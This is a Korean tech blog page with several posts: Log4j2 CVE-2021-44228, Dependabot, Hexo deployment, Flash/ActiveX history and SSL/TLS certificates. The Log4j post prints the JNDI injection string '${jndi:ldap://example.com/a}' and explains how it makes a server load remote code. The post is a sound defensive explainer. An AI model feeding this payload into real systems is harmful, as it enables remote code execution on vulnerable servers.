<h3 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h3><p><a target="_blank" rel="noopener" href="https://www.wowza.com/blog/video-codecs-encoding">https://www.wowza.com/blog/video-codecs-encoding</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2022/01/12/encoding-and-video-codecs/" data-id="cl6fthswn000reon92yw02f7u" data-title="인코딩과 비디오 코덱" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/streaming/" rel="tag">streaming</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-log4j2-vulnerability" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/12/13/log4j2-vulnerability/" class="article-date">
  <time class="dt-published" datetime="2021-12-13T14:02:39.000Z" itemprop="datePublished">2021-12-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/12/13/log4j2-vulnerability/">Log4j2 취약점(CVE-2021-44228)</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Log4j2-취약점이란"><a href="#Log4j2-취약점이란" class="headerlink" title="Log4j2 취약점이란?"></a>Log4j2 취약점이란?</h2><p>CVE-2021-44228은 2021년에 발견된, 널리 사용되는 자바 기반의 loggin 패키지인 Log4j의 취약점이다. 이는 공격자가 원격 서버에서 코드를 실행하는(Remote Code Execution, RCE) 공격을 허용하기 때문에 심각한 위협이 된다. 해당 취약점은 Log4j 버전 2(2.0-beta-9부터 2.14.1)에 존재하며, 2.15.0 버전에서 패치되었다. </p>
<h2 id="JNDI와-LDAP"><a href="#JNDI와-LDAP" class="headerlink" title="JNDI와 LDAP"></a>JNDI와 LDAP</h2><p>Log4j 패키지는 2013년에 v2.0-beta-9에서 “JNDILookup plugin”을 추가하였다. JNDI는 Java Naming and Directory Interface의 약어로, Java 프로그램이 디렉토리에 위치하는 데이터에와 자원에 접근하기 위한 인터페이스이다. Java 프로그램은 JNDI와 LDAP(Lightweight Directory Access Protocol)을 사용하여 LDAP 서버에 접근, LDAP 서버에서 객체를 로드할 수 있는데, localhost(해당 Java 프로그램이 실행되는 머신)의 LDAP 서버 말고도 LDAP URL을 사용하여 인터넷에 연결된 임의의 머신에서 실행되는 LDAP 서버를 지정할 수 있다. 즉, 공격자가 특정 Java 프로그램의 LDAP URL을 수정할 수 있는 권한을 얻게 된다면 해당 프로그램이 실행되면서 공격자가 원하는 서버에 위치한 객체를 로드할 수 있다는 것이다.</p>
<h2 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h2><p>공격자가 Log4j를 통해 ${jndi:ldap:&#x2F;&#x2F;example.com&#x2F;a} 같은 형태의 문자열을 출력할 경우, Log4j는 example.com의 LDAP서버에 접근하여 객체를 반환하게 된다. 이는 Log4j가 ${prefix:name} 형태의 특수 구문을 지원하여 여러가지 Lookup을 지원하기 때문인데, key가 “:”을 포함할 경우 기본 prefix인 “java:comp&#x2F;env&#x2F;“가 붙지 않고 LDAP 서버에 쿼리가 발생한다.<br>따라서 공격자는 log가 발생하는 input을 찾아내어 ${jndi:ldap:&#x2F;&#x2F;example.com&#x2F;a} 형식의 log가 발생하도록 하면 자신이 원하는 LDAP 서버에 위치한 코드를 실행할 수 있다. 이는 Java 기반의 인터넷과 직접 상호작용(Internet facing)하는 소프트웨어의 일반적인 공격 시나리오이며, 인터넷과 직접 상호작용하지 않는 Java 기반의 소프트웨어도 시스템 간 데이터 전송을 통해 공격 대상이 될 수 있다. 따라서, Log4j를 사용하는 모든 Java 기반 시스템은 반드시 업데이트가 요구되는 상황이다. </p>
<h3 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h3><ul>
<li><a target="_blank" rel="noopener" href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/">https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/</a></li>
<li><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2021/12/13/log4j2-vulnerability/" data-id="cl6fthswr000xeon95322fpwh" data-title="Log4j2 취약점(CVE-2021-44228)" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/security/" rel="tag">security</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-what-is-dependabot" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/19/what-is-dependabot/" class="article-date">
  <time class="dt-published" datetime="2021-11-19T18:03:25.000Z" itemprop="datePublished">2021-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/11/19/what-is-dependabot/">Dependabot은 무엇일까?</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="내-main-브랜치에-무슨-짓이야"><a href="#내-main-브랜치에-무슨-짓이야" class="headerlink" title="내 main 브랜치에 무슨 짓이야"></a>내 main 브랜치에 무슨 짓이야</h2><p>Github 리포지토리에 Dependabot이라는 봇이 main 브랜치를 내가 생성한 적이 없는 브랜치와 머지하는 PR을 작성하였다.<br><img src="/images/dpdb_pr.png"><br>PR을 확인해보니 package-lock.json, package.json, yarn.lock 3개의 파일이 변경된 것을 확인할 수 있었는데, PR의 제목처럼 hexo-renderer-marked라는 패키지의 버전을 업데이트하면서 생긴 변경임을 확인할 수 있었다.</p>
<h2 id="Dependabot이란"><a href="#Dependabot이란" class="headerlink" title="Dependabot이란?"></a>Dependabot이란?</h2><p>Dependabot은 Bump<a target="_blank" rel="noopener" href="https://github.com/gocardless/bump">1</a>라는 프로젝트로부터 출발한, 프로젝트의 의존성을 최신으로 유지하는 툴이다. 핵심 기능을 담당하는 Dependabot Core는 Ruby Gem들의 집합으로 Ruby, Python, JavaScript 등 넓은 범위의 언어를 지원하며, 리포지토리에 존재하는 코드의 의존성을 확인하여 업데이트 후 빌드하여 PR을 생성하는 기능을 수행한다.<br><img src="/images/dpdb_pr.png"><a target="_blank" rel="noopener" href="https://github.com/dependabot/dependabot-core">2</a><br><code>.github/dependabot.yml</code> 파일을 통해 업데이트 스케줄, 최대 open된 PR의 개수 등을 추가로 설정할 수 있다.</p>
<h3 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.nearform.com/blog/automatic-dependency-bump/">https://www.nearform.com/blog/automatic-dependency-bump/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/dependabot/dependabot-core">https://github.com/dependabot/dependabot-core</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2021/11/19/what-is-dependabot/" data-id="cl6fthswy001keon929ap9e7j" data-title="Dependabot은 무엇일까?" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/devops/" rel="tag">devops</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/github/" rel="tag">github</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hexo-travis-ghpage" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/17/hexo-travis-ghpage/" class="article-date">
  <time class="dt-published" datetime="2021-11-17T16:17:58.000Z" itemprop="datePublished">2021-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/11/17/hexo-travis-ghpage/">Hexo 튜토리얼: Travis CI를 사용한 Github Pages 블로그 운영</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Hexo란"><a href="#Hexo란" class="headerlink" title="Hexo란?"></a>Hexo란?</h2><p>Hexo는 GitHub Pages를 사용한 블로깅에 자주 사용되는 Jekyll과 비슷한 블로깅 프레임워크이다. Ruby Gem 형태로 사용되어 Ruby 개발환경을 세팅해야 하는 Jekyll에 비해 내 환경에 이미 설치되어있던 Node.js와 Git 두 요구사항에 의존하는 점이 마음에 들어서 사용하게 되었다.</p>
<p>Hexo는 지정 폴더의 리소스를 관리하여 블로그 애셋을 생성&#x2F;배포하는 방식으로 작동한다.<br><code>hexo init &lt;folder&gt;</code> 명령어로 블로깅에 사용할 폴더를 초기화하면 아래와 같은 형태의 구조를 갖추게 된다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>
<p>draft 폴더에 마크다운 파일을 생성하고 <code>hexo publish</code> 명령어로 이를 post로 옮겨서 게시글 작성을 관리할 수 있으며, scaffolds를 통해 사전에 정의해둔 포맷으로 게시글을 생성할 수 있다. 각 게시글 상단에 Front-matter라는 YAML 또는 JSON 형식의 메타데이터를 입력하여 해당 게시글의 제목, 태그 등의 정보를 지정할 수 있다.<br>게시글 작성을 마치고 _post 폴더로 옮긴 다음에는 .md 형식의 파일을 HTML, CSS, JS로 구성된 정적 페이지로의 변환하는 과정이 필요하다. 이를 수행하는 명령어가 <code>hexo generate</code>로, 로컬 환경에서 이를 실행한 후 호스팅하는 방식으로 사용할 수도 있겠지만, hexo는 다양한 방식의 보다 편리한 배포 및 관리를 지원한다.</p>
<h2 id="GitHub-Pages와-Travis-CI를-사용한-블로그-퍼블리싱"><a href="#GitHub-Pages와-Travis-CI를-사용한-블로그-퍼블리싱" class="headerlink" title="GitHub Pages와 Travis CI를 사용한 블로그 퍼블리싱"></a>GitHub Pages와 Travis CI를 사용한 블로그 퍼블리싱</h2><p>hexo는 git, heroku 등 다양한 환경에 맞는 배포 툴을 지원하지만, GitHub Pages를 사용하는 Hexo의 공식 튜토리얼에서는 Travis CI라는 CI 툴을 사용하여 배포를 진행한다.<br>Travis CI에 GitHub Pages 리포지토리(<strong><em>username</em>.github.io</strong>) 권한을 부여한 후, <code>.travis.yml</code> 파일을 리포지토리에 추가하여 <code>main</code> 브랜치에서 <code>gh-pages</code> 브랜치로의 배포를 자동화할 수 있다. <code>.travis.yml</code> 파일에는 <code>hexo generate</code> 명령어를 사용하여 정적 파일을 생성하는 스크립트가 설정되어 있다. 이후 리포지토리 설정에서 <code>gh-pages</code> 브랜치 내용을 GitHub Pages 사이트 소스로 설정하면, <strong><em>username</em>.github.io</strong>로 사용자의 블로그를 호스팅할 수 있다.</p>
<h3 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h3><p><a target="_blank" rel="noopener" href="https://hexo.io/ko/docs/setup">https://hexo.io/ko/docs/setup</a><br><a target="_blank" rel="noopener" href="https://hexo.io/ko/docs/github-pages">https://hexo.io/ko/docs/github-pages</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2021/11/17/hexo-travis-ghpage/" data-id="cl6fthswq000ueon9bxymax1k" data-title="Hexo 튜토리얼: Travis CI를 사용한 Github Pages 블로그 운영" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GitHub-Pages/" rel="tag">GitHub Pages</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Travis-CI/" rel="tag">Travis CI</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-video-through-web-0" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/05/video-through-web-0/" class="article-date">
  <time class="dt-published" datetime="2021-10-05T19:48:36.000Z" itemprop="datePublished">2021-10-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/05/video-through-web-0/">Adobe Flash와 ActiveX</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="웹-상에서의-사용자-경험에-대한-갈증"><a href="#웹-상에서의-사용자-경험에-대한-갈증" class="headerlink" title="웹 상에서의 사용자 경험에 대한 갈증"></a>웹 상에서의 사용자 경험에 대한 갈증</h2><p>웹을 통해 사용자에게 하이퍼텍스트 이상의 경험, 다시 말해 영상과 소리, 또는 게임 등의 상호작용이 가능한 컨텐츠를 전달하려면 어떻게 해야 할까? 클라이언트의 웹 브라우저는 HTTP 통신으로 정보를 주고받지만, 기존에 주고받던 데이터의 형태인 텍스트와 정적인 이미지에 비해 훨씬 많은 자원을 요구하는 이러한 컨텐츠를 웹을 통해 전달하고 경험하기 위해서는 특별한 고려가 필요하다. 이를 해결하기 위해 등장한 수많은 해답 중 하나인 RIA와 Browser Plugin 기술에 대해 알아보자.</p>
<h2 id="Rich-Internet-Application-RIA-RWA-x3D-Rich-Web-Appliction"><a href="#Rich-Internet-Application-RIA-RWA-x3D-Rich-Web-Appliction" class="headerlink" title="Rich Internet Application(RIA, RWA&#x3D;Rich Web Appliction)"></a>Rich Internet Application(RIA, RWA&#x3D;Rich Web Appliction)</h2><p>웹 상에서 사용자 경험을 향상시키기 위한 브라우저 확장 프로그램으로, 데스크탑 애플리케이션의 특징을 갖는 웹 애플리케이션이다. Adobe Flash의 전신인 Macromedia Flash MX로 만든 프로덕트를 설명하기 위한 개념으로 처음 소개되었으며, Java applet, 어도비 플래시, MS 실버라이트 등의 플러그인 기술로 개발한 웹 애플리케이션을 칭하는 개념으로 확장되었다.<br>주로 브라우저의 멀티미디어&#x2F;그래픽 성능을 보강하는 역할을 했지만, 브라우저, 운영체제 등 클라이언트의 환경에 따라 RIA 요소를 전부 따로 고려하여야 했기 때문에 크로스 브라우징을 지원할 때 심각한 장애 요소로 작용하여 현대의 웹에서는 퇴출되었다.</p>
<h2 id="NPAPI-Netscape-Plugin-API-와-ActiveX"><a href="#NPAPI-Netscape-Plugin-API-와-ActiveX" class="headerlink" title="NPAPI(Netscape Plugin API)와 ActiveX"></a>NPAPI(Netscape Plugin API)와 ActiveX</h2><p>NPAPI는 넷스케이프에서 개발한, 브라우저가 외부 애플리케이션(&#x3D; RIA)을 브라우저에서 플러그인 형식으로 끌어다 쓰기 위한 API이다. 다시 말하면, 브라우저에서 동작하기 어려운 기능을 구현하기 위해 클라이언트 환경에 애플리케이션을 설치한 뒤, 이를 웹 페이지에서 접근하기 위해 사용하는 API이다.<br>이것이 대세가 되면서 플래시 등의 플러그인 기술들은 이를 기반으로 개발되고, MS는 이에 대응하기 위해 IE3에 NPAPI 지원 기능을 추가하면서도 한편으로는 윈도우 + IE 환경에서만 사용이 가능한 자체 플러그인 규격인 ActiveX를 만들었다.<br>이후 IE가 시장에서 지배적인 위치를 차지하면서 IE는 NPAPI 지원을 중단하였고, ActiveX는 웹 환경에서의 보다 다양한 경험 및 기능을 위한 표준이 되어버리나, 지나친 권한을 허용함으로서 사용자의 보안을 저해하고, 여러 플랫폼에서 호환이 되지 않는 등 여러 부작용을 가져온다.<br>이러한 심각한 문제점과 모바일 기반 환경의 폭발적인 성장, 파이어폭스&#x2F;크롬 등 경쟁자의 등장 등이 맞물리면서 윈도우 및 IE의 독점적인 지위는 하락세를 걸었고, 크로스 브라우징 및 웹 표준에 대한 논의가 등장하면서 ActiveX(비슷한 문제를 가지고 있던 NPAPI까지도)는 마침내 퇴출된다.</p>
<h2 id="어도비-플래시-플래시-플레이어-액션스크립트"><a href="#어도비-플래시-플래시-플레이어-액션스크립트" class="headerlink" title="어도비 플래시, 플래시 플레이어, 액션스크립트"></a>어도비 플래시, 플래시 플레이어, 액션스크립트</h2><ul>
<li>어도비 플래시: RIA를 포함하는 다양한 프로덕트(animations, rich web applications, desktop applications, mobile apps, mobile games, and embedded web browser video players)를 개발하는 플랫폼(Java applets, MS Silverlight와 같은 레벨)</li>
<li>어도비 플래시 플레이어: 어도비 플래시에서 생산된 컨텐츠 파일(SWF 파일)을 실행하는 가상 머신</li>
<li>액션스크립트: 어도비 플래시에서의 사용(애플리케이션 개발)을 목적으로 만들어진 스크립트 언어</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2021/10/05/video-through-web-0/" data-id="cl6fthswx001jeon98vigfg0o" data-title="Adobe Flash와 ActiveX" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/history/" rel="tag">history</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-what-is-ssl-certificate" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/08/06/what-is-ssl-certificate/" class="article-date">
  <time class="dt-published" datetime="2021-08-06T16:28:37.000Z" itemprop="datePublished">2021-08-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/08/06/what-is-ssl-certificate/">SSL/TLS와 인증서의 이해</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="SSL-x2F-TLS란"><a href="#SSL-x2F-TLS란" class="headerlink" title="SSL&#x2F;TLS란?"></a>SSL&#x2F;TLS란?</h2><ul>
<li>SSL(Secure Socket Layer)은 암호 기반의 인터넷 보안 프로토콜</li>
<li>여러 번의 보완이 있었으며, 넷스케이프와 무관한 IETF가 이를 관리하면서 TLS(Transport Layer Security)로 이름이 변경</li>
<li>HTTP가 이를 사용하여 HTTPS(HTTP over TLS)를 제공하며, SNMP, FTP 등 다른 프로토콜에서도 SSL&#x2F;TLS를 사용</li>
<li>현재 SSL은 업데이트가 중단되어 많은 보안 취약점이 있고, 대다수의 웹 브라우저는 SSL을 지원하지 않는다.</li>
<li>따라서 대부분의 경우 엄밀하게 말하자면 TLS라 표기하는 것이 맞지만, SSL이 TLS를 지칭하는 용어로 자주 혼용된다.</li>
</ul>
<h2 id="SSL-x2F-TLS의-기능"><a href="#SSL-x2F-TLS의-기능" class="headerlink" title="SSL&#x2F;TLS의 기능"></a>SSL&#x2F;TLS의 기능</h2><ul>
<li>Encryption: 웹 상에서 전송되는 데이터를 암호화하여, 전송 중인 데이터를 탈취하여도 의미없게 만든다.</li>
<li>Authentication: Handshake라는 두 기기 간 인증 절차를 거침으로서 서로가 서로임을 보장해준다.</li>
<li>Integrity: 디지털 서명을 통해 데이터 무결성, 즉 데이터가 변조되지 않았음을 검증한다.</li>
</ul>
<h2 id="SSL-certificate-TLS-certificate-란"><a href="#SSL-certificate-TLS-certificate-란" class="headerlink" title="SSL certificate(TLS certificate)란?"></a>SSL certificate(TLS certificate)란?</h2><ul>
<li>웹사이트의 서버 또는 앱 서버에 저장되어 웹사이트를 인증해주는 일종의 신분증이다.</li>
<li>인증서에는 아래와 같은 정보가 포함되어 있다.<ul>
<li>도메인 네임</li>
<li>발급받은 주체(개인, 단체, 기기)</li>
<li>발급 주체(CA)</li>
<li>CA의 디지털 서명</li>
<li>적용받는 서브도메인들</li>
<li>발급 날짜</li>
<li>만료 날짜</li>
<li>퍼블릭 키</li>
</ul>
</li>
<li>인증서에는 웹사이트의 퍼블릭 키가 포함되어 사용자 디바이스는 이를 통해 웹사이트와 안전한 연결을 할 수 있도록 한다.</li>
<li>웹사이트는 별도 관리하는 프라이빗 키로 사용자가 전달한 퍼블릭 키로 암호화된 데이터를 복호화한다.</li>
<li>CA(Certificate Authorities)는 SSL 인증서를 발급해주는 기관이다.</li>
</ul>
<h2 id="SSL-certificate-validation-level"><a href="#SSL-certificate-validation-level" class="headerlink" title="SSL certificate validation level"></a>SSL certificate validation level</h2><ul>
<li>Domain Validation<ul>
<li>가장 낮은 수준의 검증</li>
<li>비용 저렴</li>
<li>해당 도메인의 control 여부만 증명: 이는 보통 DNS 레코드나 이메일을 통해 검증</li>
</ul>
</li>
<li>Organization Validation<ul>
<li>CA가 직접 인증서를 발급받는 주체와 접촉하여 검증</li>
<li>인증서에는 해당 단체의 이름과 주소 등을 포함</li>
</ul>
</li>
<li>Extended Validation<ul>
<li>SSL 인증서 발급 전, 해당 환경과 단체에 관한 폭넓은 검증</li>
<li>단체가 정말 존재하며 법적 문제 없이 등록되어있느지 등을 조사</li>
<li>시간과 비용 필요</li>
</ul>
</li>
</ul>
<h2 id="안전한-상태란"><a href="#안전한-상태란" class="headerlink" title="안전한 상태란?"></a>안전한 상태란?</h2><ul>
<li>클라이언트가 신뢰할 수 있는 상태의 인증서</li>
<li>안전한 설정<ul>
<li>안전한 프로토콜 제공(Protocol support)</li>
<li>안전한 암호(Secure Cipher Suites) 설정</li>
</ul>
</li>
</ul>
<h2 id="클라이언트가-신뢰할-수-있는-인증서"><a href="#클라이언트가-신뢰할-수-있는-인증서" class="headerlink" title="클라이언트가 신뢰할 수 있는 인증서"></a>클라이언트가 신뢰할 수 있는 인증서</h2><ol>
<li><p>서비스 도메인에 적합한 인증서 유형의 확인</p>
<ul>
<li>FQDN(Fully Qualified Domain Name: Subdomain부터 TLD까지 포함하는 완전한 도메인 이름)에 대한 개별 인증서</li>
<li>SAN(Subject Alternative Name) 인증서: 여러 FQDN에 대한 신뢰를 한번에 제공</li>
<li>Wildcard 인증서<ul>
<li>‘*’을 접두사로 사용하여 서브도메인 전체에 대한 신뢰 제공</li>
<li>첫 번째 레벨 서브 도메인에 대해서만 커버 가능: 두 번째 이하 레벨은 신뢰하지 않음</li>
</ul>
</li>
</ul>
</li>
<li><p>신뢰할 수 있는 root CA의 선택</p>
<ul>
<li>Certificate Transparency<ul>
<li>Google의 Certificate Transparency(<a target="_blank" rel="noopener" href="https://certificate.transparency.dev/">https://certificate.transparency.dev</a>) 참여 여부</li>
<li>향후 SCT(Signed Certificate Timestamp) 대응 계획</li>
<li>특정 도메인에 대한 인증서 발급 현황에 대해 누구나 조회 가능(<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a>)</li>
</ul>
</li>
<li>CA&#x2F;Browser Forum(<a target="_blank" rel="noopener" href="https://cabforum.org)의/">https://cabforum.org)의</a> Base Requirement에 따른 운영 여부</li>
</ul>
</li>
<li><p>인증서 프라이빗 키를 안전하게 보관</p>
<ul>
<li>인증서를 발급받을 경우 보통 아래와 같은 파일들이 생성<table>
<thead>
<tr>
<th>Index</th>
<th>Purpose</th>
<th>Filename</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>CA로부터 서명 받은 인증서(X.509 형식)</td>
<td>cert.pem</td>
</tr>
<tr>
<td>2</td>
<td>인증서의 개인키(Certificate’s private key)</td>
<td>privkey.pem</td>
</tr>
<tr>
<td>3</td>
<td>중간 CA의 인증서</td>
<td>chain.pem</td>
</tr>
<tr>
<td>4</td>
<td>Fullchain(1+3 combined)</td>
<td>fullchain.pem</td>
</tr>
</tbody></table>
</li>
<li>2번 파일인 인증서의 개인키는 안전한 곳에서 최초 생성 후 접근 불가하도록 설정</li>
<li>나머지 파일들은 클라이언트가 접속할 때 전달</li>
</ul>
</li>
<li><p>웹서버에서 적절한 중간 CA 인증서 설정: 클라이언트에서 Chain of Trust 확인</p>
<ul>
<li>위 테이블의 3, 4번 파일</li>
<li>클라이언트가 인증서를 신뢰할 수 있는 근거를 전달하는 절차</li>
<li>클라이언트는 접속할 서버에서 보낸 인증서 내용 확인 후 신뢰할 수 있는 CA의 서명을 확인</li>
<li>클라이언트가 전달받은 leaf 인증서를 서명한 중간 CA 정보와, 중간 CA를 서명한 root CA가 이미 신뢰하는 root CA의 목록에 있는지 차례대로 확인(Chain of Trust)하여 검증</li>
<li>따라서, 중간 CA 정보를 클라이언트에 전달하지 못하면 root CA에 대한 신뢰관계를 검증하지 못할 수도(대부분 클라이언트들은 신뢰하는 중간 CA 정보도 설정하기 때문에 문제가 없는 경우가 많음) 있기 때문에 중간 CA 정보를 설정하는 것이 좋음</li>
<li>root CA와 중간 CA를 굳이 분리하는 것은 신뢰구조 전체가 무너지는 것을 방지하기 위함이며, root CA는 중간 CA를 서명하기 위해서만 제한적으로 사용되고 실제 발급되는 leaf 인증서의 발급(서명)에는 중간 CA를 사용하는 구조가 보편적.<br> <img src="/images/Chain_Of_Trust.png"></li>
<li>CSR(Cross Signed Root): 클라이언트의 신뢰하는 root CA 목록에 해당 root CA가 포함되지 않을 수 있는데(클라이언트 환경이 오래되었거나, root CA가 비교적 최근에 작성되었을 경우), 이 경우 대부분의 클라이언트가 신뢰하는 root CA에게 별도로 서명을 받아두기도 하며 이를 CSR이라 한다.</li>
<li>SNI(Server Name Indication): 여러 도메인을 하나의 웹 서버로 서비스할 때, 접속하고자 하는 호스트네임을 요청하여 적절한 인증서를 받아 오기 위해 SNI를 지원하는 클라이언트 환경이 요구될 수 있다.</li>
</ul>
</li>
</ol>
<h2 id="안전한-설정"><a href="#안전한-설정" class="headerlink" title="안전한 설정"></a>안전한 설정</h2><ol>
<li>사용하는 OpenSSL 라이브러리의 지속적인 업데이트<ul>
<li>라이브러리 커플링: 웹서버 설치 시 OpenSSL 라이브러리를 정적으로 빌드하면 업데이트할 시 웹서버를 새로 빌드&#x2F;배포해야 하므로, 시스템 라이브러리를 사용하여 웹서버와 분리할 것을 권장</li>
</ul>
</li>
<li>안전하지 않은 프로토콜의 배제<ul>
<li>TLS는 지속적으로 보안 수준을 높여가고 있으므로 최신 버전 프로토콜만 사용하도록 하는 것이 바람직하나, 호환성을 고려하여 상황에 따라 결정</li>
</ul>
</li>
<li>안전한 cipher suite 설정<ul>
<li>Cipher Suite: 안전한 연결 생성을 위한 4개의 암호화 알고리즘<ol>
<li>키 교환(Key exchange&#x2F;agreement)</li>
<li>접속 시 상대 확인(Authentication)</li>
<li>기밀성을 위한 블록 암호화(Block&#x2F;stream cipher)</li>
<li>메시지 무결성을 위한 암호화(Message authentication)</li>
</ol>
</li>
<li>cipher suite를 구성하는 알고리즘을 결정하는 데 있어 대규모 트래픽 처리 시 성능을 고려해야 할 때도 있으므로 테스트를 해보는 것이 좋음</li>
</ul>
</li>
</ol>
<p>출처:<br><a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/what-is-ssl/">https://www.cloudflare.com/learning/ssl/what-is-ssl/</a><br><a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/">https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/</a><br><a target="_blank" rel="noopener" href="https://engineering.linecorp.com/ko/blog/best-practices-to-secure-your-ssl-tls/">https://engineering.linecorp.com/ko/blog/best-practices-to-secure-your-ssl-tls/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2021/08/06/what-is-ssl-certificate/" data-id="cl6fthsxg003qeon9831pb7wi" data-title="SSL/TLS와 인증서의 이해" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/network/" rel="tag">network</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tslop-05" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/08/01/tslop-05/" class="article-date">
  <time class="dt-published" datetime="2021-08-01T13:18:02.000Z" itemprop="datePublished">2021-08-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/08/01/tslop-05/">The Secret Life of Programs - 05. Computer Architecture</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="프로시저-서브루틴-함수"><a href="#프로시저-서브루틴-함수" class="headerlink" title="프로시저, 서브루틴, 함수"></a>프로시저, 서브루틴, 함수</h2><ul>
<li>함수를 호출, 실행하고 다시 원래 자리로 돌아오기 위해서는 어디서 함수를 호출하였는지를 기억해야 하는데, 이는 바로 프로그램 카운터의 값이다.</li>
<li>반환 주소를 저장하고, 이를 간접 호출하여 분기해서 돌아오는 과정은 많은 작업이 필요하므로 대부분의 기계는 이를 구현한 명령어를 제공한다.</li>
</ul>
<h2 id="스택"><a href="#스택" class="headerlink" title="스택"></a>스택</h2><ul>
<li>반환 위치 저장할 메모리 주소가 하나뿐이라면 반환 위치가 덮어씌워지기 때문에 재귀 함수를 사용할 수 없다.</li>
<li>따라서, 함수를 호출할 때에는 반환 위치를 LIFO로 가져오기 위해 스택을 사용하며, 스택의 크기를 초과하는 것을 스택 오버플로, 빈 스택에서 데이터를 가져오려고 하는 경우를 스택 언더플로라 한다.</li>
